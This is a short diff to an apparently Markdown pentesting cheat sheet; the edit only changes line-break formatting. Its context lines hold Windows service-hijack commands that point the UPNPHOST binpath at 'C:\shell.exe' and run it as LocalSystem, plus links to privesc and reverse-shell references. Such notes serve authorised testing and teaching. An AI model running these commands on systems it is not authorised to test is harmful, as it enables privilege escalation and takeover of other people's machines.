@@ -247,10 +247,10 @@ WinPrivChk: https://github.com/pentestmonkey/windows-privesc-check
 *net start UPNPHOST*\
 *sc config upnphost binpath= “C:\shell.exe”*\
 *sc config upnphost obj= “.\LocalSystem” password= “”*\
-*net start upnphost*\
-
-
-
+*net start upnphost*
+\
+\
+\
 # Linux Post-Exploitation
 
 Shell Cheatsheet: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 
